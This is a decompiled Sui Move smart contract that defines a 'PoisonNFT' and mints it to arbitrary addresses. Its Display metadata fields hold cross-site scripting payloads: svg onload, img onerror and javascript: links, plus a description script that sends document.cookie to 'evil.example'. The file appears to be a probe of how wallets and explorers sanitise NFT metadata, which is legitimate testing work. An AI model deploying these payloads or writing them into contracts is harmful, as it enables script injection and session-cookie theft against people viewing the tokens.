module 0x643ce2c821d087f77566207b725bca85cee4dc6ca39155b8a1048ea02743201f::nft {
    struct PoisonNFT has store, key {
        id: 0x2::object::UID,
        label: vector<u8>,
    }

    struct NFT has drop {
        dummy_field: bool,
    }

    fun init(arg0: NFT, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::package::claim<NFT>(arg0, arg1);
        let v1 = 0x2::display::new<PoisonNFT>(&v0, arg1);
        0x2::display::add<PoisonNFT>(&mut v1, 0x1::string::utf8(b"name"), 0x1::string::utf8(b"<svg/onload=alert('XSS-display-name')>"));
        0x2::display::add<PoisonNFT>(&mut v1, 0x1::string::utf8(b"description"), 0x1::string::utf8(b"<script>fetch('https://evil.example/'+document.cookie)</script>"));
        0x2::display::add<PoisonNFT>(&mut v1, 0x1::string::utf8(b"image_url"), 0x1::string::utf8(b"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert('XSS-display-image')%22%2F%3E"));
        0x2::display::add<PoisonNFT>(&mut v1, 0x1::string::utf8(b"link"), 0x1::string::utf8(b"javascript:alert('XSS-display-link')"));
        0x2::display::add<PoisonNFT>(&mut v1, 0x1::string::utf8(b"project_url"), 0x1::string::utf8(b"javascript:alert('XSS-display-project')"));
        0x2::display::add<PoisonNFT>(&mut v1, 0x1::string::utf8(b"creator"), 0x1::string::utf8(b"<img src=x onerror=alert('XSS-display-creator')>"));
        0x2::display::update_version<PoisonNFT>(&mut v1);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v0, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<PoisonNFT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint(arg0: vector<u8>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = PoisonNFT{
            id    : 0x2::object::new(arg2),
            label : arg0,
        };
        0x2::transfer::public_transfer<PoisonNFT>(v0, arg1);
    }

    // decompiled from Move bytecode v7
}

